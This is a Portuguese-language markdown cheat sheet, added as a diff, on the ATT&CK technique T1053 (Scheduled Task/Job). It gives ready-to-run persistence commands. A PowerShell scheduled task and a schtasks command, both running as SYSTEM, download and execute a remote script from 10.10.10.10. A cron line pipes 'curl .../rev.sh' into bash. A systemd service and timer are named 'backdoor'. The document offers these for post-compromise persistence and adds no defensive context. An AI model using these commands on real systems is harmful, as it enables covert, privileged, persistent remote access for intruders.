@@ -1,0 +1,88 @@
+
+# T1053 - Scheduled Task/Job
+
+A técnica **T1053 - Scheduled Task/Job** consiste na criação ou modificação de tarefas agendadas (jobs) com o objetivo de obter persistência, execução remota, ou elevação de privilégios em um sistema comprometido.
+
+---
+
+## ✅ Windows - PowerShell
+
+```powershell
+# Criar uma tarefa que executa um payload a cada 5 minutos
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr http://10.10.10.10/rev.ps1)"
+$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Hours 1)
+Register-ScheduledTask -TaskName "UpdateCheck" -Action $Action -Trigger $Trigger -User "SYSTEM" -RunLevel Highest -Force
+```
+
+---
+
+## ✅ Windows - CMD
+
+```cmd
+# Criar uma tarefa para executar um payload PowerShell
+schtasks /create /tn "OneDriveSync" /tr "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/rev.ps1')" /sc minute /mo 5 /ru SYSTEM
+```
+
+```cmd
+# Ver tarefas existentes
+schtasks /query /fo LIST /v
+```
+
+---
+
+## ✅ Linux - cron
+
+```bash
+# Editar cron do usuário atual
+crontab -e
+
+# Adicionar linha:
+*/5 * * * * /bin/bash -c 'curl http://10.10.10.10/rev.sh | bash'
+```
+
+```bash
+# Ver cron jobs
+crontab -l
+```
+
+---
+
+## ✅ Linux - systemd timer
+
+```bash
+# Criar um serviço
+echo -e "[Unit]
+Description=Backdoor
+
+[Service]
+ExecStart=/bin/bash /opt/payload.sh" > /etc/systemd/system/backdoor.service
+
+# Criar um timer
+echo -e "[Unit]
+Description=Timer
+
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=5min
+Unit=backdoor.service
+
+[Install]
+WantedBy=timers.target" > /etc/systemd/system/backdoor.timer
+
+# Ativar
+systemctl enable backdoor.timer
+systemctl start backdoor.timer
+```
+
+---
+
+## Casos de Uso
+
+- Persistência após reboot;
+- Execução repetitiva de payloads maliciosos;
+- Execução com privilégios elevados via SYSTEM;
+- Ativação de implantes em horários específicos.
+
+---
+
+Essa técnica é extremamente comum para manter acesso em máquinas pós-comprometimento, sendo difícil de detectar em ambientes mal monitorados.
